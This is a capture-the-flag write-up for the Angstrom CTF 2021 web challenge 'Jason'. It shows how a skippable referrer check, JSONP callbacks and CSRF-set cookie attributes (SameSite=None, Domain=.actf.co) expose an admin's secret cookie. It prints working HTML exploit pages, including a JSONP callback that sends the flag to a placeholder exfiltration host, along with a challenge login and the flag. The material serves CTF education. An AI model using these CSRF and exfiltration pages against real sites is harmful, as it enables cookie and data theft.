---
title: Jason - Angstrom CTF 2021
date: 2021-04-08
author: Az3z3l
author_url: https://twitter.com/Az3z3l
categories:
 - Web Exploitation
tags:
 - XSS
 - CSRF
 - Cookies
 - AngstromCTF
---

**tl;dr**

+ Intended: Append ` ; secure; samesite=none` to cookie. Now,  `<script src="https://jason.2021.chall.actf.co/flags?callback=load"></script>` would retrieve the flag. 
+ Unintended: Append .actf.co as domain to cookie using CSRF -> Setup a xss payload in reaction.py challenge -> Log in to this using CSRF -> Payload in Reaction.py exfiltrates document.cookie

<!--more-->

**Number of Solves**: 41
**Points**: 180

**Solved by**: [Az3z3l](https://twitter.com/Az3z3l) & [Captain-Kay](https://twitter.com/Captainkay11)

## Challenge Description

Jason has the [coolest site](https://jason.2021.chall.actf.co/). He knows so many languages, and he, uh, well... trust me, he's cool. So cool, in fact, that he claims to be unhackable. He even released his source code!

Downloads: [jason.zip](jason.zip)

## Solution

<br />

### First Impression

The challenge runs on NodeJS and uses `res.jsonp` to send back responses from endpoints. One of the endpoints, `/passcode` takes in POST data and appends the value to the cookie. For a secret cookie value(which is set in the admin bot), `flag` endpoint returns us the flag. Another thing to note is that there is a referrer check, which checks the referrer _and if it is set_, it must start with the actual domain name. 


<br />

### Basic Understanding

The referrer is being checked like this, 
```js
function sameOrigin (req, res, next) {
	if (req.get('referer') && !req.get('referer').startsWith(process.env.URL))
		return res.sendStatus(403)
	return next()
}
```

The condition says `req.get('referrer') && !req.get('referer').startsWith(process.env.URL)`. So, to bypass this all we need to do is make sure that referrer is not being sent. Coz, in this case, req.get('referrer') would fail and 403 won't be sent. 

`res.jsonp` endpoint has a _defult endpoint_ called callback that could be used to get back JSONp data. Using a script tag and an endpoint with jsonp callback, we can retrieve the data. 

Soooo,

```html

<!DOCTYPE html>
<html>
<meta name="referrer" content="no-referrer">
<script src="https://jason.2021.chall.actf.co/languages?callback=console.log"></script>
</html>


<!--
the script would return
/**/ typeof console.log === 'function' && console.log({"category":"languages","items":["C++","Rust","OCaml","Lisp","Physical touch"]});
which is valid js

and thus

console.log is executed
-->
```

<br />

### The Problem:

To retrieve flag, we need to send the passcode cookie to the flag endpoint. The issue is that, with chrome's latest update, all the cookies are defaulted to [lax](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite) and this prevents the cookies from being sent cross-site. 

<br />

## Intended Solution

Recent changes in chrome made lax default. Due to this, the cookies dont get sent in cross origin requests. Though Chrome did this, they added some compatibility fixes.

```
Q: What is the Lax + POST mitigation?
This is a specific exception made to account for existing cookie usage on some Single Sign-On implementations where a CSRF token is expected on a cross-site POST request. This is purely a temporary solution and will be removed in the future. It does not add any new behavior, but instead is just not applying the new SameSite=Lax default in certain scenarios.

Specifically, a cookie that is at most 2 minutes old will be sent on a top-level cross-site POST request. However, if you rely on this behavior, you should update these cookies with the SameSite=None; Secure attributes to ensure they continue to function in the future.
```
source : [link](https://www.chromium.org/updates/same-site/faq)

Now, all we need to do is append `; secure; samesite=none` to the cookie and then read flag using script tag. 

```html
<html>
    <head>
        <title>
            INTENDED
        </title>
        <meta name="referrer" content="no-referrer">
    </head>
    <body>
    <script>
            function load (data) {
                var x = data.items.map(i => ` ${i} `).join('')
                var y = btoa(x)
                window.open("https://exfiltrate/?fleg="+y);
            }

            window.open("/csrf_to_setcookie.html");
    </script>   
    <script src="https://jason.2021.chall.actf.co/flag?callback=load"></script>
    </body>
</html>

<!-- index.html -->
```

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="referrer" content="no-referrer">
    <title>Set Cookie domains</title>
</head>
<body>
    <form action="https://jason.2021.chall.actf.co/passcode" id="csrf-form" method="POST">
        <input name="passcode" value="; secure; samesite=none">
    </form>
    <script>document.getElementById("csrf-form").submit()</script>
</body>
</html>

<!-- csrf_to_setcookie.html  -->
```

Although this method is amazing, we failed to notice this while solving and resorted to an unintended way. 

<br />

## Unintended

This challenge was running on `https://jason.2021.chall.actf.co`. And when the cookie was being set, the domain for it, by default is set to the domain recieving the cookie. In this case `https://jason.2021.chall.actf.co`. We aren't allowed to set other domains other than the recieving one, but... we can set cookies for all subdomains of the particular domain. I.e, in this case, by adding `;Domain:.actf.co`, we can set the passcode cookie across all `.actf.co` domains. 

We don't have xss in this challenge, but, if we had any on one of the `.actf.co` domains, we can exfiltrate the cookie. 

There were two more client side challenges in this CTF - Reaction.py, Nomnom _(we won't be using nomnom as the payload works only on FireFox)_ and they ran on.... .actf.co subdomains \o/

Writeup for `reaction.py` ->  TBD


The flow to solve this challenge is: 

Setup xss payload in reaction.py challenge  (This is done on our end before sending link to admin) -> <br />
CSRF to add `;Domain:.actf.co` on payload  (Now admin's passcode would be accessible across all .actf.co domains) -> <br />
Login to your account that has the xss payload in reaction.py

<br />

### Payloads

```html
<!DOCTYPE html>
<html>
    <head>
        <title>
            go boom
        </title>
        <meta name="referrer" content="no-referrer">
    </head>
    <body>
        <script>
            async function exploit() {
                window.open("/csrf_to_setcookie.html");
                window.open("https://reactionpy.2021.chall.actf.co/register")
                window.open('/csrf_to_login_reactpy.html');
                }
            }      
            exploit();
        </script>
    </body>
</html>

<!-- index.html -->
```

<br />

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="referrer" content="no-referrer">
    <title>Set Cookie domain</title>
</head>
<body>
    <form action="https://jason.2021.chall.actf.co/passcode" id="csrf-form" method="POST">
        <input name="passcode" value=";Domain=.actf.co">
    </form>
    <script>document.getElementById("csrf-form").submit()</script>
</body>
</html>

<!-- csrf_to_setcookie.html -->
```

<br />

```html
<!DOCTYPE html>
<html>
<head>
    <meta name="referrer" content="no-referrer">
    <title>Login to reactpy challenge</title>
</head>
<body>
    <form action="https://reactionpy.2021.chall.actf.co/login" id="csrf-form" method="POST">
        <input name="username" value="az3z3l">
        <input name="pw" value="star7ricks">
    </form>
    <script>document.getElementById("csrf-form").submit()</script>
</body>
</html>

<!-- csrf_to_login_reactpy.html -->
```

<br />

## Flag

actf{jason's_site_isn't_so_lax_after_all}


<br />